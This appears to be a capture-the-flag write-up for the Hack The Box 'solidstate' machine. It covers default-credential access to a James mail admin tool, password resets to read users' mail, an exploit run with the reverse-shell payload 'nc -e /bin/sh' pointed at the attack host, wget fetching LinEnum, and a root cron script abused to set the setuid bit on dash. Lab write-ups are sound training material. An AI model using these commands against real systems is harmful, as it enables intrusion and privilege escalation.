<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>solidstate</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
<p><a href="#solidstate">solidstate</a></p>
<ol>
<li><a href="#nmap">nmap</a></li>
<ol>
<li><a href="#all ports">all ports</a></li>
</ol>
<li><a href="#port 4555">port 4555</a></li>
<ol>
<li><a href="#telnet ">telnet </a></li>
<li><a href="#listusers">listusers</a></li>
<li><a href="#setpassword">setpassword</a></li>
</ol>
<li><a href="#port 110 POP">port 110 POP</a></li>
<ol>
<li><a href="#james/no emails">james/no emails</a></li>
<li><a href="#thomas/no emails">thomas/no emails</a></li>
<li><a href="#mailadmin/no emails">mailadmin/no emails</a></li>
<li><a href="#john">john</a></li>
<ol>
<li><a href="#email 1">email 1</a></li>
</ol>
<li><a href="#mindy">mindy</a></li>
<ol>
<li><a href="#email 1">email 1</a></li>
<li><a href="#email 2">email 2</a></li>
</ol>
</ol>
<li><a href="#ssh mindy@10.10.10.51">ssh mindy@10.10.10.51</a></li>
<ol>
<li><a href="#User.txt">User.txt</a></li>
</ol>
<li><a href="#james apache server OSI">james apache server OSI</a></li>
<ol>
<li><a href="#searchsploit">searchsploit</a></li>
<li><a href="#35513.py RCE">35513.py RCE</a></li>
<ol>
<li><a href="#run">run</a></li>
<li><a href="#Reverse Shell">Reverse Shell</a></li>
</ol>
</ol>
<li><a href="#privesc">privesc</a></li>
<ol>
<li><a href="#enumeration">enumeration</a></li>
<ol>
<li><a href="#LinEnum">LinEnum</a></li>
<ol>
<li><a href="#report">report</a></li>
<ol>
<li><a href="#system">system</a></li>
<li><a href="#Users/Groups">Users/Groups</a></li>
<li><a href="#Environmental">Environmental</a></li>
<li><a href="#Jobs/Tasks">Jobs/Tasks</a></li>
<li><a href="#Networking">Networking</a></li>
<li><a href="#Services">Services</a></li>
<li><a href="#Software">Software</a></li>
<li><a href="#Interesting">Interesting</a></li>
</ol>
</ol>
</ol>
<li><a href="#/opt/temp.py">/opt/temp.py</a></li>
<ol>
<li><a href="#/tmp/st0ve">/tmp/st0ve</a></li>
<li><a href="#add sticky bit to DASH">add sticky bit to DASH</a></li>
<ol>
<li><a href="#root.txt">root.txt</a></li>
</ol>
</ol>
</ol>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>solidstate</u></b></h1><img alt="images/395-1.png" src="images/395-1.png"/><br/><img alt="images/395-2.png" src="images/395-2.png"/><br/></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><img alt="images/396-1.png" src="images/396-1.png"/><br/><span style="color:#24ff00;">Note <br/></span><span style="color:#ffa500;">ssh</span><span style="color:#24ff00;"> service </span><span style="color:#ffa500;">OpenSSH 7.4p1 </span><span style="color:#24ff00;">is running on port 22<br/></span><span style="color:#ffa500;">smtp</span><span style="color:#24ff00;"> service</span><span style="color:#ffa500;"> JAMES smtpd 2.3.2</span><span style="color:#24ff00;"> is running on port 25<br/></span><span style="color:#ffa500;">tcp</span><span style="color:#24ff00;"> service </span><span style="color:#ffa500;">Apache 2.4.25</span><span style="color:#24ff00;"> is running on port 80</span><br/><span style="color:#ffa500;">pop3</span><span style="color:#24ff00;"> service</span><span style="color:#ffa500;"> JAMES pop3d 2.3.2</span><span style="color:#24ff00;"> is running on port 110<br/></span><span style="color:#ffa500;">nntp</span><span style="color:#24ff00;"> service </span><span style="color:#ffa500;">JAMES nntpd </span><span style="color:#24ff00;">is running on port 119</span></div>
<div class="page" id="all ports"><h1><b><u>all ports</u></b></h1><img alt="images/398-1.png" src="images/398-1.png"/><br/><br/><span style="color:#24ff00;">theres a service </span><span style="color:#ffa500;">rsip</span><span style="color:#24ff00;"> running on port 4555 </span></div>
<div class="page" id="port 4555"><h1><b><u>port 4555</u></b></h1><span style="color:#24ff00;">doing an all-port scan reveals an intersting service on port </span><span style="color:#ffff00;">4555</span><span style="color:#24ff00;">....<br/>Using default credentials </span><span style="color:#ffff00;">root:root </span><span style="color:#24ff00;">logs us in:<br/><br/>It appears RSIP service is connected to the server's POP service<br/></span><img alt="images/399-1.png" src="images/399-1.png"/><br/><span style="color:#ffa500;">JAMES REMOTE ADMIN TOOL 2.3.2 </span><span style="color:#24ff00;"><br/><br/></span><img alt="images/399-2.png" src="images/399-2.png"/></div>
<div class="page" id="telnet "><h1><b><u>telnet </u></b></h1><span style="color:#24ff00;">lets telnet to the </span><span style="color:#ffa500;">rsip</span><span style="color:#24ff00;"> service with</span><br/><span style="color:#ffa500;">telnet 10.10.10.51 4555</span><br/><img alt="images/400-1.png" src="images/400-1.png"/><br/><br/><img alt="images/400-2.png" src="images/400-2.png"/></div>
<div class="page" id="listusers"><h1><b><u>listusers</u></b></h1><span style="color:#24ff00;">listusers gives us </span><br/><br/><img alt="images/401-1.png" src="images/401-1.png"/><br/><img alt="images/401-2.png" src="images/401-2.png"/></div>
<div class="page" id="setpassword"><h1><b><u>setpassword</u></b></h1><span style="color:#24ff00;">we'll reset </span><span style="color:#ffff00;">mindy's</span><span style="color:#24ff00;"> password to view her </span><span style="color:#ffff00;">emails</span><span style="color:#24ff00;"> with</span><br/><br/><span style="color:#ffa500;">setpassword &lt;user&gt; &lt;password&gt;</span><br/><img alt="images/402-1.png" src="images/402-1.png"/><br/><span style="color:#24ff00;">be sure to change the password for the other users so we can check their email as well</span></div>
<div class="page" id="port 110 POP"><h1><b><u>port 110 POP</u></b></h1><span style="color:#24ff00;">We can log into the POP server using the credntials of the users we changed on the</span><span style="color:#ffa500;"> James admin</span><span style="color:#24ff00;"> tool<br/><br/></span><img alt="images/403-1.png" src="images/403-1.png"/><br/></div>
<div class="page" id="james/no emails"><h1><b><u>james/no emails</u></b></h1><img alt="images/405-1.png" src="images/405-1.png"/><br/><img alt="images/405-2.png" src="images/405-2.png"/><br/><br/><span style="color:#24ff00;">No emails from this account</span></div>
<div class="page" id="thomas/no emails"><h1><b><u>thomas/no emails</u></b></h1><img alt="images/406-1.png" src="images/406-1.png"/></div>
<div class="page" id="mailadmin/no emails"><h1><b><u>mailadmin/no emails</u></b></h1><img alt="images/412-1.png" src="images/412-1.png"/></div>
<div class="page" id="john"><h1><b><u>john</u></b></h1></div>
<div class="page" id="email 1"><h1><b><u>email 1</u></b></h1><img alt="images/411-1.png" src="images/411-1.png"/></div>
<div class="page" id="mindy"><h1><b><u>mindy</u></b></h1><img alt="images/408-1.png" src="images/408-1.png"/></div>
<div class="page" id="email 1"><h1><b><u>email 1</u></b></h1><img alt="images/409-1.png" src="images/409-1.png"/></div>
<div class="page" id="email 2"><h1><b><u>email 2</u></b></h1><img alt="images/410-1.png" src="images/410-1.png"/><br/><span style="color:#ffff00;">P@55W0rd1!2@</span> for SSH</div>
<div class="page" id="ssh mindy@10.10.10.51"><h1><b><u>ssh mindy@10.10.10.51</u></b></h1><img alt="images/413-1.png" src="images/413-1.png"/><br/><br/><img alt="images/413-2.png" src="images/413-2.png"/><br/><span style="color:#24ff00;"><br/>Problem is we are in a </span><span style="color:#ffa500;">restricted Bash</span><span style="color:#24ff00;"> (</span><span style="color:#ffa500;">rbash</span><span style="color:#24ff00;">) environment thanks to John so we'll have to escape it somehow...<br/></span><img alt="images/413-3.png" src="images/413-3.png"/><br/><br/>We should search around to see if there are any exploits to James Admin 2.3,2 on google</div>
<div class="page" id="User.txt"><h1><b><u>User.txt</u></b></h1><img alt="images/414-1.png" src="images/414-1.png"/><br/><img alt="images/414-2.png" src="images/414-2.png"/><br/><span style="color:#ffff00;">914d0a4ebc177889b5b89a23f556fd75</span></div>
<div class="page" id="james apache server OSI"><h1><b><u>james apache server OSI</u></b></h1><span style="color:#24ff00;">Lets use google</span><br/><img alt="images/415-1.png" src="images/415-1.png"/><br/><br/><img alt="images/415-2.png" src="images/415-2.png"/><br/><br/><img alt="images/415-3.png" src="images/415-3.png"/></div>
<div class="page" id="searchsploit"><h1><b><u>searchsploit</u></b></h1><span style="color:#24ff00;">we have our exploitdb id of the exploit so lets take a look at it on our attack machine</span> <br/><img alt="images/417-1.png" src="images/417-1.png"/><br/><br/><span style="color:#ffa500;">35513.py </span><span style="color:#24ff00;">is the same program from our google search, lets move it to our working directory:</span><br/><br/><img alt="images/417-2.png" src="images/417-2.png"/><br/><span style="color:#24ff00;"><br/>we can also use </span><br/><span style="color:#ffa500;">searchsploit -m /exploits/linux/remote/35513.py</span><span style="color:#24ff00;"> to copy</span> <span style="color:#24ff00;">the exploit </span></div>
<div class="page" id="35513.py RCE"><h1><b><u>35513.py RCE</u></b></h1><span style="color:#24ff00;">Put a reverse shell in the payload to connect back to our attack machine:</span><br/><br/><span style="color:#24ff00;">payload = </span><span style="color:#ffa500;">nc -e /bin/sh 10.10.10.62 8000</span><br/><img alt="images/418-1.png" src="images/418-1.png"/><br/></div>
<div class="page" id="run"><h1><b><u>run</u></b></h1><img alt="images/420-1.png" src="images/420-1.png"/><br/><br/><span style="color:#24ff00;">perfect.... just need to log in for our payload to run:</span><br/><span style="color:#24ff00;">remember mindy's password from her emails were</span> <span style="color:#ffff00;">P@55W0rd1!2@</span> <br/><img alt="images/420-2.png" src="images/420-2.png"/></div>
<div class="page" id="Reverse Shell"><h1><b><u>Reverse Shell</u></b></h1><br/><img alt="images/421-1.png" src="images/421-1.png"/><br/><br/><span style="color:#24ff00;">success! lets import a tty shell real fast and we're in business!<br/></span><span style="color:#ffa500;">python -c ‘import pty;pty.spawn("/bin/bash")’</span><br/><img alt="images/421-2.png" src="images/421-2.png"/><br/><br/>and implement tab autocomplete as well: (use fg for foreground)<br/><br/><span style="color:#ffa500;">ctrl+z </span><span style="color:#24ff00;">to background<br/></span><span style="color:#ffa500;">stty raw -echo</span> <span style="color:#24ff00;">for tab-autocomplete to work on our shell<br/></span><span style="color:#ffa500;">fg</span><span style="color:#24ff00;"> to foreground</span><br/><br/><img alt="images/421-3.png" src="images/421-3.png"/><br/><br/></div>
<div class="page" id="privesc"><h1><b><u>privesc</u></b></h1></div>
<div class="page" id="enumeration"><h1><b><u>enumeration</u></b></h1><span style="color:#24ff00;">Lets start with uploading </span><span style="color:#ffa500;">LinEnum</span><span style="color:#24ff00;"> to the box:</span> <span style="color:#24ff00;">(or </span><span style="color:#ffa500;">lse.sh</span><span style="color:#24ff00;"> if you prefer)</span><br/><img alt="images/423-1.png" src="images/423-1.png"/><br/><br/></div>
<div class="page" id="LinEnum"><h1><b><u>LinEnum</u></b></h1><span style="color:#24ff00;">use wget to download </span><a href="HacktheBox--Linux_Boxes--solidstate--privesc--enumeration--LinEnum.html">LinEnum</a><span style="color:#24ff00;"> onto our victim</span><br/><br/><span style="color:#ffa500;">wget 10.10.14.62:8001/LinEnum.sh</span><br/><img alt="images/424-1.png" src="images/424-1.png"/><br/><br/><span style="color:#24ff00;">We find from the search there is a world-writeable file called</span><span style="color:#ffa500;"> tmp.py </span><span style="color:#24ff00;">we can work with that is </span><span style="color:#ffff00;">OWNED BY ROOT</span> <span style="color:#24ff00;">and executeable by </span><span style="color:#ffff00;">anyone</span><span style="color:#24ff00;">!</span><br/><img alt="images/424-2.png" src="images/424-2.png"/><br/></div>
<div class="page" id="report"><h1><b><u>report</u></b></h1><span style="color:#24ff00;">Specify</span><span style="color:#ffa500;"> -t</span><span style="color:#24ff00;"> for thorough scan!</span><br/><br/><span style="color:#ffa500;">./LinEnum.sh -t</span><br/><img alt="images/425-1.png" src="images/425-1.png"/><br/><img alt="images/425-2.png" src="images/425-2.png"/><br/><br/></div>
<div class="page" id="system"><h1><b><u>system</u></b></h1><img alt="images/426-1.png" src="images/426-1.png"/><br/><img alt="images/426-2.png" src="images/426-2.png"/><br/><br/><br/></div>
<div class="page" id="Users/Groups"><h1><b><u>Users/Groups</u></b></h1><img alt="images/427-1.png" src="images/427-1.png"/><br/><br/><br/><img alt="images/427-2.png" src="images/427-2.png"/><br/><img alt="images/427-3.png" src="images/427-3.png"/><br/><br/><img alt="images/427-4.png" src="images/427-4.png"/><br/><img alt="images/427-5.png" src="images/427-5.png"/><br/><br/><img alt="images/427-6.png" src="images/427-6.png"/><br/><img alt="images/427-7.png" src="images/427-7.png"/><br/><br/><br/></div>
<div class="page" id="Environmental"><h1><b><u>Environmental</u></b></h1><img alt="images/428-1.png" src="images/428-1.png"/><br/><br/><img alt="images/428-2.png" src="images/428-2.png"/><br/><img alt="images/428-3.png" src="images/428-3.png"/><br/><img alt="images/428-4.png" src="images/428-4.png"/></div>
<div class="page" id="Jobs/Tasks"><h1><b><u>Jobs/Tasks</u></b></h1><img alt="images/429-1.png" src="images/429-1.png"/><br/><img alt="images/429-2.png" src="images/429-2.png"/><br/><br/><img alt="images/429-3.png" src="images/429-3.png"/><br/><br/><img alt="images/429-4.png" src="images/429-4.png"/><br/><img alt="images/429-5.png" src="images/429-5.png"/><br/></div>
<div class="page" id="Networking"><h1><b><u>Networking</u></b></h1><img alt="images/430-1.png" src="images/430-1.png"/><br/><br/><img alt="images/430-2.png" src="images/430-2.png"/><br/><br/><img alt="images/430-3.png" src="images/430-3.png"/><br/><img alt="images/430-4.png" src="images/430-4.png"/><br/><br/><img alt="images/430-5.png" src="images/430-5.png"/><br/><br/><img alt="images/430-6.png" src="images/430-6.png"/><br/><br/><img alt="images/430-7.png" src="images/430-7.png"/></div>
<div class="page" id="Services"><h1><b><u>Services</u></b></h1><img alt="images/431-1.png" src="images/431-1.png"/><br/><br/><img alt="images/431-2.png" src="images/431-2.png"/><br/></div>
<div class="page" id="Software"><h1><b><u>Software</u></b></h1><img alt="images/432-1.png" src="images/432-1.png"/></div>
<div class="page" id="Interesting"><h1><b><u>Interesting</u></b></h1><img alt="images/433-1.png" src="images/433-1.png"/><br/><img alt="images/433-2.png" src="images/433-2.png"/><br/><img alt="images/433-3.png" src="images/433-3.png"/><br/><img alt="images/433-4.png" src="images/433-4.png"/><br/><br/><img alt="images/433-5.png" src="images/433-5.png"/></div>
<div class="page" id="/opt/temp.py"><h1><b><u>/opt/temp.py</u></b></h1><span style="color:#24ff00;">Checking out the contents of </span><span style="color:#ffa500;">tmp.py</span><br/><img alt="images/434-1.png" src="images/434-1.png"/><br/><br/><span style="color:#24ff00;">we see that touch is installed on the box to utilize:</span><br/><img alt="images/434-2.png" src="images/434-2.png"/><br/><br/><span style="color:#24ff00;">we can rewrite tmp.py with the code:</span><br/><span style="color:#ffa500;">#!/bin/bash<br/>/usr/bin/touch tmp/st0ve</span><br/><br/><span style="color:#24ff00;">lets touch the file</span><span style="color:#ffa500;"> /tmp/st0ve</span><span style="color:#24ff00;"> in /opt/tmp.py to see if we can give the file </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;"> permissions:</span><br/><br/><br/></div>
<div class="page" id="/tmp/st0ve"><h1><b><u>/tmp/st0ve</u></b></h1><h2>we can see we created the file st0ve owned by root with touch program so we know the Cron is running</h2><br/><img alt="images/435-1.png" src="images/435-1.png"/></div>
<div class="page" id="add sticky bit to DASH"><h1><b><u>add sticky bit to DASH</u></b></h1><h2>we see that Dash is not sim-linked (symbolically linked) to bash on this box which means its a binaryindependent of bash, but more importantly...</h2><br/><br/><h2>DASH does NOT strip the setUID bit like bash does, so if we add setuid bits to DASH we can run it as though we were root!</h2><br/><img alt="images/436-1.png" src="images/436-1.png"/><br/><br/><br/><br/><h2>rewriting chmod 4755 /bin/dash to tmp.py to put a sticky-bit on that dash binary as root</h2><br/><img alt="images/436-2.png" src="images/436-2.png"/><br/><br/><h2>now simply run /bin/dash and we pop a shell with root privileges!</h2></div>
<div class="page" id="root.txt"><h1><b><u>root.txt</u></b></h1><img alt="images/437-1.png" src="images/437-1.png"/><br/><h2>b4c9723a28899b1c45db281d99cc87c9</h2></div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><br/><img alt="images/1962-1.png" src="images/1962-1.png"/><br/></div>
</div></body></html>